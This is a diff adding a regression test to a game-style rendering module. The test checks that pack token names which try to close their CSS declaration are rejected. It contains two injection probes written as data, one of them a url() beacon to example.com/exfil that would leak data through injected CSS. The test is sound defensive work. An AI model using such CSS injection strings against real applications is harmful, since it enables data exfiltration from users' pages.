@@ -6,6 +6,7 @@ import {
 	GameStyleWriter,
 } from "../src/features/modes/styleElement";
 import { adrenalinePack } from "../src/games/adrenaline";
+import { readPackTokens } from "../src/games/fromSchema";
 import { resolveGamePack } from "../src/games/registry";
 import { DEFAULT_SETTINGS, normalizeSettings } from "../src/settings/types";
 
@@ -210,5 +211,40 @@ processors.get("theme-card")?.(
 
 assert.equal(container.classList.contains(BLOCK_SCOPE_CLASS), true);
 assert.equal(container.classList.contains(MODE_CLASS), true);
+
+/* ------------------------------------------------------------------ *
+ * A token name is trusted structurally, never in content: it reaches
+ * `renderTokens` verbatim once `readPackTokens` accepts it, so a name that
+ * could close its own declaration must never get that far.
+ * ------------------------------------------------------------------ */
+
+const maliciousTokens = readPackTokens(
+	{
+		"--safe-token": "red",
+		"--evil} body { background: url(https://example.com/exfil?": "x",
+		"--also-evil; } .brumes--city-of-mist": "x",
+	},
+	"style scope injection probe",
+);
+
+assert.deepEqual(Object.keys(maliciousTokens), ["--safe-token"]);
+
+const injectedCss = buildGameStyle(
+	"legend-in-the-mist",
+	{
+		base: {
+			note: maliciousTokens,
+			workspace: {},
+		},
+		light: { note: {}, workspace: {} },
+		dark: { note: {}, workspace: {} },
+	},
+	false,
+	[],
+);
+
+assert.doesNotMatch(injectedCss, /exfil/);
+assert.doesNotMatch(injectedCss, /evil/);
+assert.match(injectedCss, /--safe-token: red/);
 
 console.log("game styles stay inside notes and rendered block scopes");
